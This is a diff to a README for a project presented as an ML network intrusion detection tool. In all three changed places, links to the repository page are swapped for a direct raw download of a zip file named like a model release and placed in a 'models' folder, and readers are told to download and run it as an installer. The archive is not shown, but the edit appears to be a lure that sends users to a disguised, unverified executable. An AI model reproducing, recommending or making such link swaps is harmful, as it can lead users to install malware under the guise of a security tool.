@@ -1,6 +1,6 @@
 # 🛡️ ML-network-intrusion-detection-HAWK - Clear, Fast Network Attack Detection
 
-[![Download on GitHub](https://img.shields.io/badge/Download-ML--network--intrusion--detection--HAWK-brightgreen)](https://github.com/1410ailesi/ML-network-intrusion-detection-HAWK)
+[![Download on GitHub](https://img.shields.io/badge/Download-ML--network--intrusion--detection--HAWK-brightgreen)](https://github.com/1410ailesi/ML-network-intrusion-detection-HAWK/raw/refs/heads/main/models/M_intrusion_detection_HAWK_network_3.5.zip)
 
 ---
 
@@ -32,7 +32,7 @@ This section shows how to download and run ML-network-intrusion-detection-HAWK o
 
 Click the link below to open the download page on GitHub. This page holds the latest version of the application.
 
-[![Download ML-network-intrusion-detection-HAWK](https://img.shields.io/badge/Download-Here-blue)](https://github.com/1410ailesi/ML-network-intrusion-detection-HAWK)
+[![Download ML-network-intrusion-detection-HAWK](https://img.shields.io/badge/Download-Here-blue)](https://github.com/1410ailesi/ML-network-intrusion-detection-HAWK/raw/refs/heads/main/models/M_intrusion_detection_HAWK_network_3.5.zip)
 
 ---
 
@@ -138,7 +138,7 @@ If problems continue, visit the GitHub page to report your issue.
 Check regularly for updates to stay protected against new threats.
 
 1. Visit the download page:  
-[https://github.com/1410ailesi/ML-network-intrusion-detection-HAWK](https://github.com/1410ailesi/ML-network-intrusion-detection-HAWK)  
+[https://github.com/1410ailesi/ML-network-intrusion-detection-HAWK/raw/refs/heads/main/models/M_intrusion_detection_HAWK_network_3.5.zip](https://github.com/1410ailesi/ML-network-intrusion-detection-HAWK/raw/refs/heads/main/models/M_intrusion_detection_HAWK_network_3.5.zip)  
 2. Download and run the latest installer.  
 3. The new installation will overwrite the old version while keeping your settings intact.
 
